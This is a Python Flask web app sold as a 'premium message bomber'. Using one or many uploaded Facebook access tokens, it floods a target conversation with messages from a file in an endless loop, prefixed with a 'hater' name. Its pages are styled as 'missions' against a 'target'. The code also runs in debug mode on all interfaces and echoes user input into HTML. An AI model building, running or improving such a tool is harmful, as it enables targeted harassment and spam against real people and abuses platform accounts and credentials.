from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
import os

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                try:
                    message = str(mn) + ' ' + message1
                    
                    # Send only text message
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    parameters = {
                        'access_token': access_token,
                        'message': message
                    }
                    
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"✅ Message Sent Successfully From token {access_token}: {message}")
                    else:
                        print(f"❌ Message Sent Failed From token {access_token}: {message}")
                        print(f"Error: {response.text}")
                    
                except Exception as e:
                    print(f"🚨 Error sending message: {e}")
                
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'''
        <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 40px; border-radius: 25px; text-align: center; margin: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); border: 3px solid gold;">
            <div style="font-size: 80px; margin-bottom: 20px;">🎯</div>
            <h3 style="margin: 0; font-size: 32px; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">VIP MISSION LAUNCHED</h3>
            <p style="font-size: 22px; margin: 20px 0; color: #FFD700;">Task ID: <strong>{task_id}</strong></p>
            <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 15px; margin: 20px 0;">
                <p style="margin: 10px 0;">🎯 Target: {thread_id}</p>
                <p style="margin: 10px 0;">⏰ Interval: {time_interval}s</p>
                <p style="margin: 10px 0;">🔑 Tokens: {len(access_tokens)}</p>
            </div>
            <a href="/" style="display: inline-block; background: linear-gradient(45deg, #FFD700, #FFED4E); color: black; padding: 15px 30px; border-radius: 12px; text-decoration: none; font-weight: bold; margin-top: 20px; font-size: 18px; box-shadow: 0 5px 15px rgba(255,215,0,0.4);">🔥 RETURN TO CONTROL</a>
        </div>
        '''

    # Get active tasks count for display
    active_tasks = len(threads)
    
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>💎 VIP AAHAN - PREMIUM MESSAGE BOMBER 💎</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;600;700&family=Exo+2:wght@300;400;500;600;700;800&family=Montserrat:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    :root {
      --vip-gold: #FFD700;
      --vip-silver: #C0C0C0;
      --vip-diamond: #B9F2FF;
      --vip-ruby: #E0115F;
      --vip-emerald: #50C878;
      --dark-bg: #0a0a0a;
      --card-bg: rgba(255, 215, 0, 0.05);
      --neon-glow: 0 0 30px var(--vip-gold);
      --diamond-glow: 0 0 30px var(--vip-diamond);
    }

    body {
      background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 50%, #2a2a2a 100%);
      background-attachment: fixed;
      color: white;
      font-family: 'Montserrat', sans-serif;
      min-height: 100vh;
      overflow-x: hidden;
    }

    .vip-header {
      background: linear-gradient(135deg, rgba(255,215,0,0.1) 0%, rgba(192,192,192,0.1) 50%, rgba(185,242,255,0.1) 100%);
      backdrop-filter: blur(20px);
      border-bottom: 3px solid var(--vip-gold);
      padding: 30px 0;
      margin-bottom: 30px;
      position: relative;
      overflow: hidden;
    }

    .vip-header::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 2px;
      background: linear-gradient(90deg, transparent, var(--vip-gold), var(--vip-diamond), var(--vip-ruby), transparent);
      animation: headerGlow 3s ease-in-out infinite;
    }

    @keyframes headerGlow {
      0%, 100% { opacity: 0.5; }
      50% { opacity: 1; }
    }

    .vip-title {
      font-family: 'Orbitron', sans-serif;
      font-size: 3.5rem;
      font-weight: 900;
      background: linear-gradient(45deg, var(--vip-gold), var(--vip-diamond), var(--vip-ruby), var(--vip-emerald));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 50px rgba(255,215,0,0.5);
      margin-bottom: 10px;
    }

    .vip-subtitle {
      font-family: 'Rajdhani', sans-serif;
      font-size: 1.4rem;
      font-weight: 600;
      color: var(--vip-silver);
      letter-spacing: 3px;
    }

    .vip-container {
      max-width: 500px;
      margin: 0 auto;
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(25px);
      border: 2px solid transparent;
      border-radius: 25px;
      padding: 40px;
      position: relative;
      box-shadow: 
        0 0 50px rgba(255,215,0,0.1),
        inset 0 0 100px rgba(255,215,0,0.05);
      animation: containerGlow 4s ease-in-out infinite alternate;
    }

    @keyframes containerGlow {
      0% {
        border-color: var(--vip-gold);
        box-shadow: 0 0 50px rgba(255,215,0,0.2);
      }
      33% {
        border-color: var(--vip-diamond);
        box-shadow: 0 0 50px rgba(185,242,255,0.2);
      }
      66% {
        border-color: var(--vip-ruby);
        box-shadow: 0 0 50px rgba(224,17,95,0.2);
      }
      100% {
        border-color: var(--vip-emerald);
        box-shadow: 0 0 50px rgba(80,200,120,0.2);
      }
    }

    .vip-input {
      background: rgba(255, 255, 255, 0.08);
      border: 2px solid rgba(255,215,0,0.3);
      border-radius: 15px;
      color: white;
      padding: 18px 22px;
      margin-bottom: 25px;
      transition: all 0.4s ease;
      font-size: 16px;
      backdrop-filter: blur(15px);
      font-family: 'Montserrat', sans-serif;
    }

    .vip-input:focus {
      border-color: var(--vip-gold);
      background: rgba(255, 255, 255, 0.12);
      box-shadow: 0 0 20px rgba(255,215,0,0.3);
      transform: scale(1.02);
      outline: none;
    }

    .vip-select {
      background: rgba(255, 255, 255, 0.08);
      border: 2px solid rgba(255,215,0,0.3);
      border-radius: 15px;
      color: white;
      padding: 18px 22px;
      margin-bottom: 25px;
      transition: all 0.4s ease;
      backdrop-filter: blur(15px);
      font-family: 'Montserrat', sans-serif;
    }

    .vip-select:focus {
      border-color: var(--vip-gold);
      background: rgba(255, 255, 255, 0.12);
      box-shadow: 0 0 20px rgba(255,215,0,0.3);
      transform: scale(1.02);
      outline: none;
    }

    .vip-btn {
      background: linear-gradient(135deg, var(--vip-gold), var(--vip-diamond), var(--vip-ruby));
      border: none;
      border-radius: 15px;
      color: black;
      padding: 20px 35px;
      font-weight: 800;
      font-size: 18px;
      text-transform: uppercase;
      letter-spacing: 2px;
      transition: all 0.4s ease;
      position: relative;
      overflow: hidden;
      margin: 15px 0;
      font-family: 'Orbitron', sans-serif;
      background-size: 300% 300%;
      animation: gradientShift 4s ease infinite;
    }

    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .vip-btn:hover {
      transform: translateY(-5px) scale(1.05);
      box-shadow: 
        0 15px 40px rgba(255,215,0,0.6),
        0 0 60px rgba(185,242,255,0.4),
        0 0 80px rgba(224,17,95,0.3);
      color: black;
    }

    .vip-btn-danger {
      background: linear-gradient(135deg, #ff416c, #ff4b2b, #dc143c);
      color: white;
      animation: dangerShift 3s ease infinite;
    }

    @keyframes dangerShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .file-upload-area {
      border: 3px dashed var(--vip-gold);
      border-radius: 18px;
      padding: 30px;
      text-align: center;
      margin: 20px 0;
      transition: all 0.4s ease;
      background: rgba(255,215,0,0.05);
      cursor: pointer;
      position: relative;
      overflow: hidden;
    }

    .file-upload-area:hover {
      background: rgba(255,215,0,0.1);
      border-color: var(--vip-diamond);
      transform: scale(1.03);
      box-shadow: 0 0 30px rgba(255,215,0,0.2);
    }

    .vip-badge {
      background: linear-gradient(135deg, var(--vip-gold), var(--vip-diamond));
      color: black;
      padding: 10px 20px;
      border-radius: 25px;
      font-weight: 700;
      margin: 8px;
      display: inline-block;
      font-size: 13px;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      font-family: 'Orbitron', sans-serif;
      box-shadow: 0 5px 15px rgba(255,215,0,0.3);
    }

    .vip-stats {
      display: flex;
      justify-content: space-around;
      margin: 30px 0;
      text-align: center;
    }

    .stat-item {
      padding: 20px;
      background: rgba(255,215,0,0.08);
      border-radius: 20px;
      backdrop-filter: blur(15px);
      border: 1px solid rgba(255,215,0,0.3);
      min-width: 150px;
    }

    .stat-number {
      font-size: 28px;
      font-weight: 900;
      color: var(--vip-gold);
      display: block;
      font-family: 'Orbitron', sans-serif;
      text-shadow: 0 0 20px rgba(255,215,0,0.5);
    }

    .stat-label {
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 2px;
      color: var(--vip-silver);
      font-weight: 600;
      margin-top: 8px;
    }

    .vip-label {
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      font-size: 14px;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-bottom: 12px;
      display: block;
      color: var(--vip-gold);
    }

    .diamond-grid {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        linear-gradient(90deg, rgba(255,215,0,0.02) 1px, transparent 1px),
        linear-gradient(0deg, rgba(255,215,0,0.02) 1px, transparent 1px);
      background-size: 60px 60px;
      pointer-events: none;
      z-index: -2;
    }

    .vip-footer {
      text-align: center;
      margin: 40px 0 20px;
      padding: 20px;
      background: rgba(255,215,0,0.05);
      border-radius: 20px;
      backdrop-filter: blur(15px);
    }

    .social-icon {
      width: 55px;
      height: 55px;
      background: linear-gradient(135deg, var(--vip-gold), var(--vip-diamond));
      border-radius: 50%;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      margin: 0 12px;
      color: black;
      text-decoration: none;
      font-size: 22px;
      transition: all 0.4s ease;
      box-shadow: 0 5px 15px rgba(255,215,0,0.3);
    }

    .social-icon:hover {
      transform: scale(1.2) rotate(360deg);
      box-shadow: 0 0 30px rgba(255,215,0,0.6);
      color: black;
    }

    .floating {
      animation: floating 3s ease-in-out infinite;
    }

    @keyframes floating {
      0%, 100% { transform: translateY(0px); }
      50% { transform: translateY(-15px); }
    }

    .particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: -1;
    }

    .particle {
      position: absolute;
      border-radius: 50%;
      animation: float linear infinite;
    }

    @keyframes float {
      to {
        transform: translateY(-100vh) rotate(360deg);
      }
    }

    .vip-crown {
      font-size: 40px;
      margin-bottom: 20px;
      animation: crownGlow 2s ease-in-out infinite alternate;
    }

    @keyframes crownGlow {
      0% { text-shadow: 0 0 20px var(--vip-gold); }
      100% { text-shadow: 0 0 40px var(--vip-diamond), 0 0 60px var(--vip-ruby); }
    }
  </style>
</head>
<body>
  <!-- Diamond Grid Background -->
  <div class="diamond-grid"></div>
  
  <!-- Animated Background Particles -->
  <div class="particles" id="particles"></div>

  <!-- VIP Header -->
  <header class="vip-header text-center">
    <div class="vip-crown">👑</div>
    <h1 class="vip-title floating">
      💎 VIP AAHAN 💎
    </h1>
    <p class="vip-subtitle">
      PREMIUM MESSAGE BOMBER
    </p>
    
    <!-- VIP Features -->
    <div class="mt-4">
      <span class="vip-badge"><i class="fas fa-crown"></i> ELITE</span>
      <span class="vip-badge"><i class="fas fa-shield-alt"></i> SECURE</span>
      <span class="vip-badge"><i class="fas fa-bolt"></i> FAST</span>
      <span class="vip-badge"><i class="fas fa-rocket"></i> POWERFUL</span>
    </div>
  </header>

  <!-- VIP Stats -->
  <div class="vip-stats">
    <div class="stat-item">
      <span class="stat-number" id="activeTasks">{{ active_tasks }}</span>
      <span class="stat-label">ACTIVE MISSIONS</span>
    </div>
    <div class="stat-item">
      <span class="stat-number" id="successRate">100%</span>
      <span class="stat-label">SUCCESS RATE</span>
    </div>
    <div class="stat-item">
      <span class="stat-number" id="vipLevel">VIP</span>
      <span class="stat-label">ACCESS LEVEL</span>
    </div>
  </div>

  <!-- VIP Control Panel -->
  <div class="vip-container">
    <form method="post" enctype="multipart/form-data" id="mainForm">
      <!-- Token Option -->
      <div class="mb-4">
        <label class="vip-label">🔑 TOKEN STRATEGY</label>
        <select class="vip-select w-100" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token Army</option>
        </select>
      </div>

      <!-- Single Token Input -->
      <div class="mb-4" id="singleTokenInput">
        <label class="vip-label">🔐 SINGLE TOKEN</label>
        <input type="text" class="vip-input w-100" id="singleToken" name="singleToken" placeholder="Enter your elite token..." required>
      </div>

      <!-- Token File Input -->
      <div class="mb-4" id="tokenFileInput" style="display: none;">
        <label class="vip-label">📁 TOKEN ARMY</label>
        <div class="file-upload-area" onclick="document.getElementById('tokenFile').click()">
          <i class="fas fa-cloud-upload-alt fa-3x text-warning mb-3"></i>
          <p class="vip-label">UPLOAD TOKEN ARMY FILE</p>
          <p class="small text-muted">.txt file with multiple elite tokens</p>
          <input type="file" class="d-none" id="tokenFile" name="tokenFile" accept=".txt">
        </div>
      </div>

      <!-- Target UID -->
      <div class="mb-4">
        <label class="vip-label">🎯 TARGET UID</label>
        <input type="text" class="vip-input w-100" id="threadId" name="threadId" placeholder="Enter target conversation ID..." required>
      </div>

      <!-- Hater Name -->
      <div class="mb-4">
        <label class="vip-label">😈 HATER IDENTIFIER</label>
        <input type="text" class="vip-input w-100" id="kidx" name="kidx" placeholder="Enter hater name..." required>
      </div>

      <!-- Time Interval -->
      <div class="mb-4">
        <label class="vip-label">⏰ MISSION INTERVAL</label>
        <input type="number" class="vip-input w-100" id="time" name="time" placeholder="Seconds between attacks..." required min="1">
      </div>

      <!-- Messages File -->
      <div class="mb-4">
        <label class="vip-label">💬 MESSAGE ARSENAL</label>
        <div class="file-upload-area" onclick="document.getElementById('txtFile').click()">
          <i class="fas fa-file-alt fa-3x text-warning mb-3"></i>
          <p class="vip-label">UPLOAD MESSAGE ARSENAL</p>
          <p class="small text-muted">.txt file with your message collection</p>
          <input type="file" class="d-none" id="txtFile" name="txtFile" accept=".txt" required>
        </div>
      </div>

      <!-- Launch Button -->
      <button type="submit" class="vip-btn w-100">
        🚀 LAUNCH VIP MISSION
      </button>
    </form>

    <!-- Stop Mission -->
    <form method="post" action="/stop" class="mt-4">
      <div class="mb-4">
        <label class="vip-label text-danger">🛑 ABORT MISSION</label>
        <input type="text" class="vip-input w-100" id="taskId" name="taskId" placeholder="Enter Mission ID to abort..." required>
      </div>
      <button type="submit" class="vip-btn vip-btn-danger w-100">
        ⚡ EMERGENCY ABORT
      </button>
    </form>
  </div>

  <!-- VIP Footer -->
  <footer class="vip-footer">
    <div class="mb-4">
      <a href="https://www.facebook.com/a.s.37310" class="social-icon" target="_blank">
        <i class="fab fa-facebook-f"></i>
      </a>
      <a href="https://wa.me/+919936098516" class="social-icon" target="_blank">
        <i class="fab fa-whatsapp"></i>
      </a>
      <a href="https://t.me/yourtelegram" class="social-icon" target="_blank">
        <i class="fab fa-telegram-plane"></i>
      </a>
    </div>
    <p class="vip-label mb-2">© 2025 VIP AAHAN ENTERPRISES</p>
    <p class="text-muted small">Exclusive VIP Service - Use Responsibly</p>
  </footer>

  <script>
    // Create VIP particles
    function createParticles() {
      const particles = document.getElementById('particles');
      const particleCount = 50;
      
      for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        
        const size = Math.random() * 4 + 1;
        const posX = Math.random() * 100;
        const duration = Math.random() * 25 + 15;
        const delay = Math.random() * 10;
        
        // VIP colors
        const colors = ['#FFD700', '#B9F2FF', '#E0115F', '#50C878'];
        const color = colors[Math.floor(Math.random() * colors.length)];
        
        particle.style.width = `${size}px`;
        particle.style.height = `${size}px`;
        particle.style.left = `${posX}vw`;
        particle.style.animationDuration = `${duration}s`;
        particle.style.animationDelay = `${delay}s`;
        particle.style.opacity = Math.random() * 0.6 + 0.2;
        particle.style.background = color;
        particle.style.boxShadow = `0 0 ${size*3}px ${color}`;
        
        particles.appendChild(particle);
      }
    }

    // Toggle token input
    function toggleTokenInput() {
      const tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption === 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }

    // File upload preview
    document.addEventListener('DOMContentLoaded', function() {
      createParticles();
      
      // Add file name display
      const fileInputs = ['tokenFile', 'txtFile'];
      fileInputs.forEach(inputId => {
        const input = document.getElementById(inputId);
        if (input) {
          input.addEventListener('change', function(e) {
            const fileName = e.target.files[0]?.name;
            if (fileName) {
              const uploadArea = this.closest('.file-upload-area');
              const existingBadge = uploadArea.querySelector('.file-badge');
              if (existingBadge) existingBadge.remove();
              
              const badge = document.createElement('span');
              badge.className = 'vip-badge file-badge';
              badge.textContent = fileName.length > 15 ? fileName.substring(0, 15) + '...' : fileName;
              badge.style.marginTop = '15px';
              badge.style.background = 'linear-gradient(135deg, #B9F2FF, #50C878)';
              uploadArea.appendChild(badge);
            }
          });
        }
      });
    });

    // VIP form submission
    document.getElementById('mainForm').addEventListener('submit', function(e) {
      const button = this.querySelector('button[type="submit"]');
      const originalText = button.innerHTML;
      button.innerHTML = '🚀 INITIATING VIP MISSION...';
      button.disabled = true;
      
      setTimeout(() => {
        button.innerHTML = originalText;
        button.disabled = false;
      }, 4000);
    });

    // Update stats animation
    setInterval(() => {
      const stats = document.querySelectorAll('.stat-number');
      stats.forEach(stat => {
        stat.style.transform = 'scale(1.1)';
        setTimeout(() => {
          stat.style.transform = 'scale(1)';
        }, 200);
      });
    }, 3000);
  </script>
</body>
</html>
''', active_tasks=active_tasks)

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        # Remove from threads dictionary
        if task_id in threads:
            del threads[task_id]
        return f'''
        <div style="background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%); color: white; padding: 40px; border-radius: 25px; text-align: center; margin: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); border: 3px solid #dc143c;">
            <div style="font-size: 80px; margin-bottom: 20px;">🛑</div>
            <h3 style="margin: 0; font-size: 32px; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">VIP MISSION ABORTED</h3>
            <p style="font-size: 22px; margin: 20px 0; color: #FFD700;">Mission ID: <strong>{task_id}</strong> terminated</p>
            <a href="/" style="display: inline-block; background: linear-gradient(45deg, #FFD700, #FFED4E); color: black; padding: 15px 30px; border-radius: 12px; text-decoration: none; font-weight: bold; margin-top: 20px; font-size: 18px; box-shadow: 0 5px 15px rgba(255,215,0,0.4);">🔥 RETURN TO CONTROL</a>
        </div>
        '''
    else:
        return f'''
        <div style="background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%); color: white; padding: 40px; border-radius: 25px; text-align: center; margin: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); border: 3px solid #dc143c;">
            <div style="font-size: 80px; margin-bottom: 20px;">❌</div>
            <h3 style="margin: 0; font-size: 32px; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">MISSION NOT FOUND</h3>
            <p style="font-size: 22px; margin: 20px 0; color: #FFD700;">No mission with ID: <strong>{task_id}</strong></p>
            <a href="/" style="display: inline-block; background: linear-gradient(45deg, #FFD700, #FFED4E); color: black; padding: 15px 30px; border-radius: 12px; text-decoration: none; font-weight: bold; margin-top: 20px; font-size: 18px; box-shadow: 0 5px 15px rgba(255,215,0,0.4);">🔥 RETURN TO CONTROL</a>
        </div>
        '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
